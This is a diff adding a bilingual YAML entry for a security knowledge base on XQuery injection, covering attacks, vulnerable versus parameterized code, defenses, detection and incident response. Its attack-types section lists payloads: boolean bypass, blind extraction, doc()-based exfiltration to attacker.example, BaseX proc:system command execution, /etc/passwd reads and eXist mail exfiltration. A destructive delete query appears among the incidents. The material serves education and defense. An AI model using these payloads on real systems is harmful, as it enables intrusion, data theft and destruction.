@@ -1,0 +1,374 @@
+meta:
+  id: xqueryinjection
+  threatId: '1.19'
+  severity: Critical
+  color: '#0e7490'
+  colorRgb: 14,116,144
+  cwe: CWE-652
+  cvss: '9.1'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'XQuery '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: XQuery Injection
+  lead:
+    en: SQL injection's exact analog for XML databases -- but with a higher ceiling. XPath injection is constrained to node selection; XQuery is a full, Turing-complete functional language (W3C spec), and its native XML databases ship extension modules that turn a confirmed injection into arbitrary file read/write or OS command execution. BaseX's proc:system() runs a real shell command from inside a stylesheet-equivalent query, no gadget chain required. Unlike SQLi's vast CVE corpus, all three independent research passes found no confirmed, named product CVE for this class -- a genuinely thin, largely academic area, reported honestly here rather than manufacturing an incident that doesn't exist.
+    pl: Dokładny odpowiednik SQL injection dla baz danych XML -- ale z wyższym sufitem. Wstrzyknięcie XPath jest ograniczone do selekcji węzłów; XQuery to pełny, Turing-zupełny język funkcyjny (specyfikacja W3C), a jego natywne bazy danych XML dostarczają moduły rozszerzeń które zamieniają potwierdzone wstrzyknięcie w dowolny odczyt/zapis pliku albo wykonanie polecenia OS. proc:system() BaseX uruchamia prawdziwe polecenie powłoki z wnętrza zapytania odpowiadającego arkuszowi stylów, bez potrzeby łańcucha gadżetów. W przeciwieństwie do ogromnego korpusu CVE SQLi, wszystkie trzy niezależne przejścia badawcze nie znalazły żadnego potwierdzonego, nazwanego CVE produktu dla tej klasy -- naprawdę wąski, głównie akademicki obszar, zgłoszony tu uczciwie zamiast wymyślania nieistniejącego incydentu.
+  metrics:
+  - k: CWE-652
+    v:
+      en: Weakness ID (child of CWE-91 + CWE-943)
+      pl: ID słabości (dziecko CWE-91 + CWE-943)
+  - k: '9.1'
+    v: CVSS · Critical (representative, RCE ceiling)
+  - k: A03:2021
+    v: OWASP Top 10
+  - k: '6'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: CWE-652 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/652.html
+  - label: CAPEC-84 — XQuery Injection
+    url: https://capec.mitre.org/data/definitions/84.html
+  - label: Balisage 2011 — XQuery Injection (van der Vlist)
+    url: https://www.balisage.net/Proceedings/vol7/html/Vlist02/BalisageVol7-Vlist02.html
+  - label: BaseX — Process Functions (proc:system)
+    url: https://docs.basex.org/main/Process_Functions
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Six variants, escalating from the classic SQLi-style boolean bypass to full RCE via database-specific extension modules -- reachability of the last three depends entirely on which modules are enabled in the target's deployment.
+      pl: Sześć wariantów, eskalujących od klasycznego obejścia boolowskiego w stylu SQLi do pełnego RCE przez moduły rozszerzeń specyficzne dla bazy danych -- osiągalność ostatnich trzech zależy całkowicie od tego które moduły są włączone we wdrożeniu celu.
+    items:
+    - name: Authentication / logic bypass via boolean injection
+      sev: high
+      description:
+        en: 'The textbook case, structurally identical to SQLi''s '' OR 1=1 --: breaking out of a string predicate with a tautology. //user[name='''' or ''1''=''1''] matches every user regardless of the intended filter.'
+        pl: 'Podręcznikowy przypadek, strukturalnie identyczny do '' OR 1=1 -- SQLi: wyłamanie się z predykatu string przez tautologię. //user[name='''' or ''1''=''1''] pasuje do każdego użytkownika niezależnie od zamierzonego filtra.'
+      payload: name = "' or '1'='1"   ->   //user[name='' or '1'='1']
+    - name: Blind boolean-based XQuery injection
+      sev: high
+      description:
+        en: When no data is reflected directly, a true/false injected predicate (comparing substring() output character-by-character) still produces a detectable presence/absence difference in the response. XQuery has no standard time-delay function analogous to SQL's SLEEP() -- a genuine gap from SQLi, so time-based blind techniques rely on an artificially heavy computation or a processor-specific extension instead.
+        pl: Gdy żadne dane nie są bezpośrednio odbite, wstrzyknięty predykat prawda/fałsz (porównujący wyjście substring() znak po znaku) wciąż produkuje wykrywalną różnicę obecności/braku w odpowiedzi. XQuery nie ma standardowej funkcji opóźnienia czasowego analogicznej do SLEEP() SQL -- prawdziwa luka względem SQLi, więc techniki ślepe oparte na czasie polegają zamiast tego na sztucznie ciężkich obliczeniach albo rozszerzeniu specyficznym dla procesora.
+      payload: ''' and substring(//user[1]/password,1,1)=''a'' or ''''='''
+    - name: Cross-scope data exfiltration via // and doc()/collection()
+      sev: high
+      description:
+        en: Because injected code can start from // (the whole context) or call doc()/collection() to reach documents outside the query's intended scope, an attacker widens a single-table lookup into a dump of the entire XML database -- and doc() reaching a remote URL becomes an out-of-band exfiltration channel.
+        pl: Ponieważ wstrzyknięty kod może zaczynać się od // (cały kontekst) albo wywołać doc()/collection() by dosięgnąć dokumentów poza zamierzonym zakresem zapytania, atakujący poszerza wyszukiwanie jednej tabeli w zrzut całej bazy danych XML -- a doc() dosięgające zdalnego URL staje się kanałem eksfiltracji out-of-band.
+      payload: '''foo'' = doc(concat(''http://attacker.example/?root='', name(/*[1])))'
+    - name: RCE via BaseX proc:system() / file:* extension modules
+      sev: critical
+      description:
+        en: BaseX's Process Module (namespace http://basex.org/modules/proc) runs an arbitrary OS command from within a query and returns its output; the EXPath File Module (file:read-text, file:write) gives arbitrary filesystem read/write. Neither is gated by a built-in permission check -- restriction is entirely a deployment/configuration responsibility, so a confirmed injection against an unrestricted BaseX instance is functionally RCE.
+        pl: Moduł procesów BaseX (przestrzeń nazw http://basex.org/modules/proc) uruchamia dowolne polecenie OS z wnętrza zapytania i zwraca jego wyjście; moduł plików EXPath (file:read-text, file:write) daje dowolny odczyt/zapis systemu plików. Żaden nie jest bramkowany przez wbudowaną kontrolę uprawnień -- ograniczenie jest całkowicie odpowiedzialnością wdrożenia/konfiguracji, więc potwierdzone wstrzyknięcie przeciw nieograniczonej instancji BaseX jest funkcjonalnie RCE.
+      payload: for $x in proc:system('id') return $x   |   file:read-text('/etc/passwd')
+    - name: Exfiltration / destruction via eXist-db util:eval and extension modules
+      sev: critical
+      description:
+        en: util:eval()/util:eval-inline() dynamically execute a second string as XQuery in the current context -- a classic secondary-injection gadget. Combined with eXist's mail extension module, a real, documented technique emails the entire database out to an attacker-controlled address; the XQuery Update Facility (insert/delete/replace) additionally makes destructive writes possible, not just reads.
+        pl: util:eval()/util:eval-inline() dynamicznie wykonują drugi string jako XQuery w bieżącym kontekście -- klasyczny gadżet wtórnego wstrzyknięcia. Połączone z modułem rozszerzenia mail eXist, realna, udokumentowana technika wysyła całą bazę danych mailem na adres kontrolowany przez atakującego; Update Facility XQuery (insert/delete/replace) dodatkowo umożliwia destrukcyjne zapisy, nie tylko odczyty.
+      payload: util:eval-inline('mail:send-email(&lt;mail&gt;...&lt;body&gt;{util:serialize(/*,())}&lt;/body&gt;&lt;/mail&gt;)')
+    - name: MarkLogic xdmp:eval / xdmp:value dynamic evaluation abuse
+      sev: critical
+      description:
+        en: When user input reaches the string argument of xdmp:eval()/xdmp:value(), it runs as fully dynamic XQuery inside the server -- and privilege-gated functions like xdmp:filesystem-file() or xdmp:document-load() add filesystem read and DB-load capability on top, bounded only by the executing amp/role's granted privileges.
+        pl: Gdy wejście użytkownika dociera do argumentu string xdmp:eval()/xdmp:value(), działa jako w pełni dynamiczny XQuery wewnątrz serwera -- a funkcje bramkowane uprawnieniami jak xdmp:filesystem-file() czy xdmp:document-load() dodają na to możliwość odczytu systemu plików i ładowania do bazy, ograniczoną tylko przez uprawnienia przyznane wykonującemu amp/roli.
+      payload: xdmp:eval("//user[name='" || $name || "']")   -- $name = 'x'), xdmp:filesystem-file('/etc/passwd'), ('
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'Every real XQuery API offers exactly the same fix as parameterized SQL: declare an external variable in the query text (fixed, developer-authored) and bind the untrusted value to it separately, so it can never be parsed as query syntax.'
+      pl: 'Każde prawdziwe API XQuery oferuje dokładnie tę samą naprawę co sparametryzowany SQL: zadeklaruj zmienną zewnętrzną w tekście zapytania (stałym, autorstwa developera) i zwiąż niezaufaną wartość z nią osobno, tak by nigdy nie mogła zostać sparsowana jako składnia zapytania.'
+    languages:
+    - label: Java (XQJ)
+      lang: java
+      vulnerable: '// VULNERABLE -- concatenation
+
+        String q = "for $u in //user[name=''" + name + "''] return $u";
+
+        XQPreparedExpression e = conn.prepareExpression(q);'
+      safe: '// SECURE -- bound external variable
+
+        String q = "declare variable $n external; for $u in //user[name=$n] return $u";
+
+        XQPreparedExpression e = conn.prepareExpression(q);
+
+        e.bindString(new QName("n"), name, null);'
+    - label: BaseX (Java API)
+      lang: java
+      vulnerable: '// VULNERABLE
+
+        new XQuery("for $u in //user[name=''" + name + "''] return $u").execute(context);'
+      safe: "// SECURE -- QueryProcessor.bind\ntry (QueryProcessor proc = new QueryProcessor(\n        \"declare variable $n external; //user[name=$n]\", context)) {\n  proc.bind(\"n\", name);\n  Value result = proc.value();\n}"
+    - label: eXist-db (XML:DB API)
+      lang: java
+      vulnerable: '// VULNERABLE
+
+        String xq = "//user[name=''" + name + "'']";
+
+        ResourceSet r = xqs.query(xq);'
+      safe: '// SECURE -- declareVariable
+
+        String xq = "declare variable $n external; //user[name=$n]";
+
+        xqs.declareVariable("n", name);
+
+        ResourceSet r = xqs.query(xq);'
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: Fingerprinting the processor matters more here than in most injection classes, since the escalation ceiling (read-only Saxon vs. RCE-capable BaseX) depends entirely on which extension modules that specific engine exposes.
+      pl: Rozpoznanie procesora ma tu większe znaczenie niż w większości klas wstrzyknięć, bo sufit eskalacji (tylko-do-odczytu Saxon vs zdolny do RCE BaseX) zależy całkowicie od tego które moduły rozszerzeń udostępnia ten konkretny silnik.
+    steps:
+    - title:
+        en: Probe with quote characters and boolean pairs
+        pl: Sonduj znakami cudzysłowu i parami boolowskimi
+      description:
+        en: Submit a bare ' or " and watch for XQuery parse errors; confirm with a true/false pair (' or '1'='1 vs ' and '1'='2) and compare which returns more/no results.
+        pl: Wyślij goły ' albo " i obserwuj błędy parsowania XQuery; potwierdź parą prawda/fałsz (' or '1'='1 vs ' and '1'='2) i porównaj który zwraca więcej/brak wyników.
+    - title:
+        en: Fingerprint the processor
+        pl: Rozpoznaj procesor
+      description:
+        en: 'Error-code families and resolvable namespaces reveal the engine: BaseX bracketed codes plus proc:/file: namespaces, eXist''s org.exist stack traces plus util:/request: namespaces, MarkLogic''s XDMP-* codes plus xdmp:/cts: functions, or Saxon (typically read-only, no DB extension modules -- a lower ceiling).'
+        pl: 'Rodziny kodów błędów i rozwiązywalne przestrzenie nazw ujawniają silnik: kody w nawiasach BaseX plus przestrzenie nazw proc:/file:, ślady stosu org.exist eXist plus przestrzenie nazw util:/request:, kody XDMP-* MarkLogic plus funkcje xdmp:/cts:, albo Saxon (zwykle tylko-do-odczytu, bez modułów rozszerzeń bazy danych -- niższy sufit).'
+    - title:
+        en: Escalate to blind extraction if no output is reflected
+        pl: Eskaluj do ślepej ekstrakcji jeśli żadne wyjście nie jest odbite
+      description:
+        en: Use substring()/string-length() in an injected boolean predicate to extract data character-by-character from the true/false response differential.
+        pl: Użyj substring()/string-length() we wstrzykniętym predykacie boolowskim by wyodrębnić dane znak po znaku z różnicy odpowiedzi prawda/fałsz.
+    - title:
+        en: Widen scope beyond the intended query
+        pl: Poszerz zakres poza zamierzone zapytanie
+      description:
+        en: Break into a union with // or an explicit doc()/collection() call to reach documents and collections the original query was never meant to touch.
+        pl: Wyłam się do unii przez // albo jawne wywołanie doc()/collection() by dosięgnąć dokumentów i kolekcji których oryginalne zapytanie nigdy nie miało dotykać.
+    - title:
+        en: Attempt the vendor-specific extension mechanism if reachable
+        pl: Spróbuj mechanizmu rozszerzeń specyficznego dla dostawcy jeśli osiągalny
+      description:
+        en: 'BaseX: proc:system()/file:*. eXist: util:eval() plus mail/HTTP modules. MarkLogic: xdmp:eval()/xdmp:value() plus privilege-gated filesystem functions. Escalates from data disclosure to file I/O or command execution.'
+        pl: 'BaseX: proc:system()/file:*. eXist: util:eval() plus moduły mail/HTTP. MarkLogic: xdmp:eval()/xdmp:value() plus funkcje systemu plików bramkowane uprawnieniami. Eskaluje z ujawnienia danych do I/O pliku albo wykonania polecenia.'
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Bound external variables are the near-complete fix -- but code that is otherwise parameterized can still be undone by a single leftover call to a dynamic-eval extension function (util:eval, xdmp:eval, saxon:evaluate), which is why it earns its own dedicated rank here.
+      pl: Powiązane zmienne zewnętrzne to niemal kompletna naprawa -- ale kod który poza tym jest sparametryzowany wciąż może zostać cofnięty przez jedno pozostałe wywołanie funkcji rozszerzeń dynamicznej ewaluacji (util:eval, xdmp:eval, saxon:evaluate), dlatego zasługuje tu na własne dedykowane miejsce.
+    items:
+    - rank: 1
+      eff: 97
+      kind: primary
+      label:
+        en: Bound external variables / parameterized XQuery
+        pl: Powiązane zmienne zewnętrzne / sparametryzowane XQuery
+      note:
+        en: declare variable $n external; combined with bindString()/bind()/declareVariable() (whichever the processor's API exposes) structurally separates data from query syntax -- exactly like parameterized SQL, and just as close to a complete fix.
+        pl: declare variable $n external; połączone z bindString()/bind()/declareVariable() (którekolwiek API procesora udostępnia) strukturalnie oddziela dane od składni zapytania -- dokładnie jak sparametryzowany SQL, i tak samo blisko kompletnej naprawy.
+    - rank: 2
+      eff: 85
+      kind: strong
+      label:
+        en: Avoid dynamic-eval extension functions entirely
+        pl: Całkowicie unikaj funkcji rozszerzeń dynamicznej ewaluacji
+      note:
+        en: util:eval()/util:eval-inline() (eXist), xdmp:eval()/xdmp:value() (MarkLogic), and saxon:evaluate() (Saxon) each re-open the exact injection surface a moment ago closed by parameterization, since they parse a runtime string as fresh query code. Even fully parameterized code becomes exploitable again if a single call site still concatenates into one of these.
+        pl: util:eval()/util:eval-inline() (eXist), xdmp:eval()/xdmp:value() (MarkLogic), i saxon:evaluate() (Saxon) każde ponownie otwierają dokładnie tę powierzchnię wstrzyknięcia zamkniętą przed chwilą przez parametryzację, bo parsują string czasu wykonania jako świeży kod zapytania. Nawet w pełni sparametryzowany kod znów staje się eksploatowalny jeśli jedno miejsce wywołania wciąż konkatenuje do jednego z nich.
+    - rank: 3
+      eff: 75
+      kind: strong
+      label:
+        en: Least-privilege, read-only, non-updating execution context
+        pl: Kontekst wykonania o najmniejszych uprawnieniach, tylko-do-odczytu, bez aktualizacji
+      note:
+        en: Run application queries as a role that cannot use the XQuery Update Facility and cannot reach collections outside its intended scope. Caps impact to disclosure even if an injection point survives.
+        pl: Uruchamiaj zapytania aplikacji jako rola która nie może używać Update Facility XQuery i nie może dosięgnąć kolekcji poza zamierzonym zakresem. Ogranicza wpływ do ujawnienia nawet jeśli punkt wstrzyknięcia przetrwa.
+    - rank: 4
+      eff: 70
+      kind: strong
+      label:
+        en: Disable or restrict dangerous extension modules
+        pl: Wyłącz lub ogranicz niebezpieczne moduły rozszerzeń
+      note:
+        en: BaseX proc:/file:, eXist mail/HTTP modules, and MarkLogic filesystem-privileged functions have no built-in permission gate of their own -- restriction is entirely a deployment responsibility. Removes the RCE/file-I/O ceiling even if a boolean-injection point remains.
+        pl: 'proc:/file: BaseX, moduły mail/HTTP eXist, i funkcje bramkowane uprawnieniami systemu plików MarkLogic nie mają własnej wbudowanej bramki uprawnień -- ograniczenie jest całkowicie odpowiedzialnością wdrożenia. Usuwa sufit RCE/I-O pliku nawet jeśli punkt wstrzyknięcia boolowskiego pozostaje.'
+    - rank: 5
+      eff: 40
+      kind: weak
+      label:
+        en: Input validation / escaping
+        pl: Walidacja wejścia / escapowanie
+      note:
+        en: Escaping the delimiter quote and &amp;/&lt; is brittle and encoding-bypassable (CAPEC-84 notes percent/UTF-8 encoding tricks specifically). Defense-in-depth only, never the primary control.
+        pl: Escapowanie znaku cudzysłowu ogranicznika i &amp;/&lt; jest kruche i omijalne kodowaniem (CAPEC-84 odnotowuje konkretnie sztuczki kodowania procent/UTF-8). Tylko obrona w głąb, nigdy podstawowa kontrola.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: 'An honest gap, not a fabricated one: unlike SQL injection''s vast CVE corpus, all three independent research passes searched NVD and CVE aggregators and found no confirmed, named product CVE specifically for XQuery injection. What exists instead is genuine, technically solid academic research demonstrating the exact same impact.'
+      pl: 'Uczciwa luka, nie zmyślona: w przeciwieństwie do ogromnego korpusu CVE wstrzyknięcia SQL, wszystkie trzy niezależne przejścia badawcze przeszukały NVD i agregatory CVE i nie znalazły żadnego potwierdzonego, nazwanego CVE produktu specyficznie dla wstrzyknięcia XQuery. Zamiast tego istnieje prawdziwe, technicznie solidne badanie akademickie demonstrujące dokładnie ten sam wpływ.'
+    items:
+    - org: Balisage / XML Prague (academic research)
+      year: 2011
+      impact: Working exfiltration and destructive-update exploits demonstrated against eXist-db
+      cost: No real-world breach -- the definitive practical proof-of-concept, not a product CVE
+      description:
+        en: 'Eric van der Vlist''s "XQuery Injection" paper is the foundational, still-cited technical source for this class: it demonstrates the exact boolean-bypass, cross-scope doc()-based exfiltration, and eXist mail-module data-theft techniques used throughout this deep-dive, plus a destructive Update Facility one-liner (for $u in //user return update delete $u/(@*|node())) against a naively-built eXist-db REST application.'
+        pl: 'Artykuł Erica van der Vlist "XQuery Injection" to fundamentalne, wciąż cytowane źródło techniczne dla tej klasy: demonstruje dokładnie techniki obejścia boolowskiego, eksfiltracji przez doc() poza zakres, i kradzieży danych przez moduł mail eXist używane w całym tym deep-dive, plus destrukcyjną jednolinijkową Update Facility (for $u in //user return update delete $u/(@*|node())) przeciw naiwnie zbudowanej aplikacji REST eXist-db.'
+    - org: Journal of Systems and Software / Int'l Journal of Information Security
+      year: 2016
+      impact: XQueryFuzzer black-box detection tool, tested against BaseX-backed applications
+      cost: Identified attack categories not covered by OWASP's existing taxonomy at the time
+      description:
+        en: Two companion academic papers ("Securing native XML database-driven web applications from XQuery injection vulnerabilities" and a black-box detection study) built and validated a research-grade fuzzer specifically for this class, confirming the technique is practically exploitable against real BaseX applications, not merely a theoretical construct.
+        pl: Dwa towarzyszące artykuły akademickie ("Securing native XML database-driven web applications from XQuery injection vulnerabilities" i badanie wykrywania black-box) zbudowały i zwalidowały fuzzer klasy badawczej specyficznie dla tej klasy, potwierdzając że technika jest praktycznie eksploatowalna przeciw prawdziwym aplikacjom BaseX, nie tylko teoretyczną konstrukcją.
+    inlineSources:
+    - label: Balisage 2011 — XQuery Injection (van der Vlist)
+      url: https://www.balisage.net/Proceedings/vol7/html/Vlist02/BalisageVol7-Vlist02.html
+    - label: Journal of Systems and Software (2016)
+      url: https://www.sciencedirect.com/science/article/abs/pii/S0164121216301571
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: 'A confirmed, real coverage gap compared to SQLi tooling: no mainstream DAST scanner ships dedicated XQuery-injection detection, and mainstream SAST support has historically been a pending feature request rather than a shipped capability.'
+      pl: 'Potwierdzona, realna luka pokrycia w porównaniu do narzędzi SQLi: żaden główny skaner DAST nie wysyła dedykowanej detekcji wstrzyknięcia XQuery, a wsparcie głównych SAST było historycznie oczekującą prośbą o funkcję, nie wysłaną zdolnością.'
+    sast:
+    - - CodeQL
+      - 'A CWE-652 XQuery-injection query was an open, tracked feature request (GitHub Security Lab issue #241) rather than long-standing default coverage -- check current status before assuming support'
+    - - Enterprise SAST (Checkmarx/Fortify/Veracode)
+      - Advertise XPath/XML-injection rules broadly; explicit, confirmed dedicated CWE-652 rule documentation was not found -- treat coverage as partial/inconsistent rather than assumed
+    dast:
+    - - XQueryFuzzer (academic prototype)
+      - The only purpose-built detector documented in the literature (Journal of Systems and Software / Int'l J. Information Security, 2016) -- a research tool, never productized
+    - - Manual boolean-pair + fingerprint testing
+      - The practical, expert-driven method that actually works today, per the methodology above
+    note:
+      en: <strong>Key signal:</strong> do not assume DAST/SAST parity with SQL injection here -- manual review of every XQJ/BaseX/eXist/MarkLogic query-building call site for string concatenation remains the most reliable detection method given the tooling gap.
+      pl: <strong>Kluczowy sygnał:</strong> nie zakładaj tu parytetu DAST/SAST z wstrzyknięciem SQL -- ręczny przegląd każdego miejsca budowania zapytania XQJ/BaseX/eXist/MarkLogic pod kątem konkatenacji stringów pozostaje najbardziej niezawodną metodą wykrywania biorąc pod uwagę lukę narzędziową.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: All three research passes independently verified the same CWE hierarchy directly against MITRE, with one worthwhile nuance about CWE-643's exact relationship.
+      pl: Wszystkie trzy przejścia badawcze niezależnie zweryfikowały tę samą hierarchię CWE bezpośrednio względem MITRE, z jednym wartym uwagi niuansem o dokładnej relacji CWE-643.
+    items:
+    - std: CWE (MITRE)
+      items:
+      - 'CWE-652 — Improper Neutralization of Data within XQuery Expressions (''XQuery Injection'') -- primary, Base-level, Likelihood of Exploit: High'
+      - ChildOf both CWE-91 (XML Injection) and CWE-943 (Improper Neutralization of Special Elements in Data Query Logic) -- confirmed directly on the CWE-652 page by all three research passes
+      - CWE-643 (XPath Injection, this knowledge base's own separate deep-dive) is a sibling by shared parent (also ChildOf CWE-91), not a direct parent/child link to CWE-652 -- MITRE's CWE-652 page does not itself cross-reference CWE-643
+    - std: OWASP
+      items:
+      - A03:2021 — Injection
+    inlineSources:
+    - label: CWE-652 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/652.html
+    - label: CWE-643 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/643.html
+    - label: CAPEC-84 (MITRE)
+      url: https://capec.mitre.org/data/definitions/84.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active XQuery injection exploitation is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji wstrzyknięcia XQuery, przejdź tę listę od góry.
+    steps:
+    - en: Identify the exact XML database/processor in use and whether extension modules (BaseX proc:/file:, eXist mail/util:eval, MarkLogic xdmp:eval) are enabled -- this determines the realistic blast radius
+      pl: Zidentyfikuj dokładną używaną bazę danych XML/procesor i czy moduły rozszerzeń (BaseX proc:/file:, eXist mail/util:eval, MarkLogic xdmp:eval) są włączone -- to determinuje realistyczny zasięg skutków
+    - en: Treat the host as fully compromised if a command-execution or filesystem-write extension function was confirmed reachable -- rotate all credentials/secrets accordingly
+      pl: Traktuj hosta jako w pełni skompromitowanego jeśli potwierdzono osiągalność funkcji rozszerzeń wykonania polecenia lub zapisu systemu plików -- odpowiednio zrotuj wszystkie poświadczenia/sekrety
+    - en: Grep the codebase for every XQuery query-building call site (XQJ, BaseX, eXist, MarkLogic APIs), not just the one exploited, checking each for string concatenation versus bound external variables
+      pl: Przeszukaj kod pod kątem każdego miejsca budowania zapytania XQuery (API XQJ, BaseX, eXist, MarkLogic), nie tylko tego które zostało wykorzystane, sprawdzając każde pod kątem konkatenacji stringów vs powiązanych zmiennych zewnętrznych
+    - en: Specifically audit for leftover calls to util:eval/xdmp:eval/saxon:evaluate even in otherwise-parameterized code
+      pl: Konkretnie przeaudytuj pod kątem pozostałych wywołań util:eval/xdmp:eval/saxon:evaluate nawet w kodzie który jest poza tym sparametryzowany
+    - en: Disable or tighten permissions on extension modules (proc:/file:/mail/eval functions) regardless of whether they were the confirmed vector
+      pl: Wyłącz lub zaostrz uprawnienia na modułach rozszerzeń (funkcje proc:/file:/mail/eval) niezależnie od tego czy były potwierdzonym wektorem
+    - en: Notify per applicable data-breach obligations if data was exfiltrated
+      pl: Powiadom zgodnie z obowiązującymi wymogami dot. naruszenia danych jeśli dane zostały eksfiltrowane
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: CWE-652 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/652.html
+    - label: CWE-643 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/643.html
+    - label: CAPEC-84 — XQuery Injection
+      url: https://capec.mitre.org/data/definitions/84.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: Balisage 2011 — XQuery Injection (van der Vlist)
+      url: https://www.balisage.net/Proceedings/vol7/html/Vlist02/BalisageVol7-Vlist02.html
+    - label: BaseX — Process Functions
+      url: https://docs.basex.org/main/Process_Functions
+    - label: BaseX — File Module
+      url: https://basex.readthedocs.io/en/latest/File%20Module/
+    - label: MarkLogic — xdmp:filesystem-file
+      url: https://docs.marklogic.com/xdmp:filesystem-file
+    - label: Journal of Systems and Software (2016) — XQuery injection detection
+      url: https://www.sciencedirect.com/science/article/abs/pii/S0164121216301571
